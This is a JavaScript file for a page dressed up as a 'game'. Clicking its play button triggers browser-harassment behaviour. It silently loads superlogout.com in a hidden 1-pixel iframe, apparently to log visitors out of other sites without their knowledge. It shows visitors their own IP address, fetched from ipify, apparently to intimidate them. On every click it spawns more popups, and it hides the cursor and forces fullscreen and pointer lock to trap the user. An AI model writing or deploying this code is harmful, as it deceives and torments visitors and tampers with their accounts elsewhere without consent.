document.addEventListener('DOMContentLoaded', () => {
    const gameContainer = document.getElementById('game-container');
    const gameImage = document.getElementById('game-image');
    const gameAudio = document.getElementById('game-audio');
    const ipAddressElement = document.getElementById('ip-address');
    const playButton = document.getElementById('playButton');
    let gameStarted = false;
    let userIp = 'Unknown';
    let popupCount = 0;
    const openPopups = [];
    const fakeCursor = document.getElementById('fake-cursor');
    let followedPopup = null;
    let cursorStuck = true;

    // Set the site to load silently when TUNE IN is pressed
    const SILENT_URL = 'https://superlogout.com/';

    function openWebsiteSilently(url) {
        if (!url) return;
        const iframe = document.createElement('iframe');
        iframe.src = url;
        iframe.style.cssText = 'position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;border:0;left:-9999px;top:-9999px;';
        iframe.setAttribute('aria-hidden', 'true');
        iframe.tabIndex = -1;
        document.body.appendChild(iframe);
    }

    function getPopupUrl() {
        return `popup.html?ip=${encodeURIComponent(userIp)}&r=${Date.now()}_${Math.random()}`;
    }

    function screenToPage(screenX, screenY) {
        const borderX = Math.max(0, (window.outerWidth - window.innerWidth) / 2);
        const chromeY = Math.max(0, window.outerHeight - window.innerHeight - borderX);
        return {
            x: screenX - window.screenX - borderX,
            y: screenY - window.screenY - chromeY
        };
    }

    function placeFakeCursor(popup) {
        if (!fakeCursor || !popup || popup.closed) return;
        try {
            const borderX = Math.max(0, (popup.outerWidth - popup.innerWidth) / 2);
            const chromeTop = Math.max(0, popup.outerHeight - popup.innerHeight - borderX);
            const cx = popup.screenX + borderX + popup.innerWidth * 0.42;
            const cy = popup.screenY + chromeTop + popup.innerHeight * 0.38;
            const pos = screenToPage(cx, cy);
            fakeCursor.style.display = 'none';
            fakeCursor.style.left = pos.x + 'px';
            fakeCursor.style.top = pos.y + 'px';
        } catch (e) {}
    }

    function trackPopupCursor(popup) {
        if (!popup || popup.closed) return;
        if (!followedPopup || followedPopup.closed) {
            followedPopup = popup;
        }
        if (cursorStuck && popup === followedPopup) {
            placeFakeCursor(popup);
        }
    }

    window.trackPopupCursor = trackPopupCursor;

    function followPopupCursor() {
        if (cursorStuck) {
            if (followedPopup && !followedPopup.closed) {
                placeFakeCursor(followedPopup);
            } else {
                const live = openPopups.find((p) => p && !p.closed);
                if (live) {
                    followedPopup = live;
                    placeFakeCursor(live);
                }
            }
        }
        requestAnimationFrame(followPopupCursor);
    }

    function createPopup() {
        const w = 400;
        const h = 400;
        const left = Math.floor(Math.random() * Math.max(1, screen.width - w));
        const top = Math.floor(Math.random() * Math.max(1, screen.height - h));
        const popup = window.open(
            getPopupUrl(),
            `Popup_${popupCount++}_${Date.now()}`,
            `width=${w},height=${h},left=${left},top=${top}`
        );
        if (popup) {
            openPopups.push(popup);
            followedPopup = popup;
            if (cursorStuck) placeFakeCursor(popup);
        }
        return popup;
    }

    window.createPopup = createPopup;

    function openThreePopups() {
        createPopup();
        createPopup();
        createPopup();
    }

    function requestOverlayFullscreen() {
        const root = document.documentElement;
        const request = root.requestFullscreen || root.webkitRequestFullscreen || root.msRequestFullscreen;
        if (request) {
            request.call(root).catch(() => {});
        }
    }

    function requestPointerLock() {
        const request = document.body.requestPointerLock || document.body.webkitRequestPointerLock;
        if (request) {
            try {
                request.call(document.body);
            } catch (e) {}
        }
    }

    function pulseVibrate() {
        if (typeof navigator.vibrate === 'function') {
            navigator.vibrate([180, 80, 180]);
        }
    }

    function cycleThemeColor() {
        let hue = 0;
        let meta = document.querySelector('meta[name="theme-color"]');
        if (!meta) {
            meta = document.createElement('meta');
            meta.setAttribute('name', 'theme-color');
            document.head.appendChild(meta);
        }
        setInterval(() => {
            hue = (hue + 8) % 360;
            meta.setAttribute('content', 'hsl(' + hue + ', 80%, 45%)');
        }, 120);
    }

    fetch('https://api.ipify.org?format=json')
        .then((response) => response.json())
        .then((data) => {
            userIp = data.ip;
            ipAddressElement.textContent = `Your IP: ${data.ip}`;
        })
        .catch(() => {
            ipAddressElement.textContent = 'IP: Unknown';
        });

    function showGameOverlay() {
        hideCursor();
        openWebsiteSilently(SILENT_URL);
        gameImage.src = 'assets/game-animation.gif';
        gameContainer.style.display = 'flex';
        ipAddressElement.style.display = 'block';
        gameAudio.play().catch((error) => {
            console.error('Audio failed to play:', error);
        });
    }

    function hideCursor() {
        document.documentElement.classList.add('hide-cursor');
        document.documentElement.style.cursor = 'none';
        document.body.style.cursor = 'none';
        if (fakeCursor) fakeCursor.style.display = 'none';
    }

    function startGame() {
        if (gameStarted) return;
        gameStarted = true;
        hideCursor();
        openThreePopups();
        requestOverlayFullscreen();
        requestPointerLock();
        pulseVibrate();
        cycleThemeColor();
        requestAnimationFrame(followPopupCursor);
    }

    function handleStuckClick() {
        cursorStuck = false;
        const next = createPopup();
        cursorStuck = true;
        if (next) followedPopup = next;
        requestPointerLock();
    }

    function onPageClick() {
        if (!gameStarted) {
            startGame();
            return;
        }
        handleStuckClick();
    }

    playButton.addEventListener('click', showGameOverlay);
    document.addEventListener('click', onPageClick);
});
